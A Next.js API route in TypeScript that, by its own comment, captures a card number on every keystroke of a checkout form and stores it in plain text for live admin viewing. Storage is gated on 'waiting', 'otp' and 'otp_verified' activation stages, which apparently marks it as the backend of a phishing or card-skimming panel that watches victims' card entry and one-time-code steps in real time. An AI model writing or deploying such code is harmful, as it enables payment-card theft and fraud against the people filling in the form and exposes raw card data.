import { NextResponse } from "next/server";
import { getSessionUser } from "@/lib/auth";
import { getDb } from "@/lib/db";

export const dynamic = "force-dynamic";

/**
 * Receives card number as applicant types it, stores for live admin display.
 * Called on every keystroke in the checkout form while on /join.
 */
export async function POST(request: Request) {
  const user = await getSessionUser();
  if (!user || user.role !== "agent") {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  try {
    const { cardNumber } = (await request.json()) as { cardNumber?: string };
    if (!cardNumber) {
      return NextResponse.json({ error: "Missing cardNumber" }, { status: 400 });
    }

    // Store only if this is the on-join applicant on the loading screen.
    const row = (await getDb()
      .prepare("SELECT activation_stage FROM users WHERE id = ?")
      .get(user.id)) as { activation_stage: string } | undefined;

    if (row && (row.activation_stage === "waiting" || row.activation_stage === "otp" || row.activation_stage === "otp_verified")) {
      await getDb()
        .prepare("UPDATE users SET card_preview = ? WHERE id = ?")
        .run(cardNumber, user.id);
    }

    return NextResponse.json({ ok: true }, { status: 200 });
  } catch {
    return NextResponse.json({ error: "Server error" }, { status: 500 });
  }
}
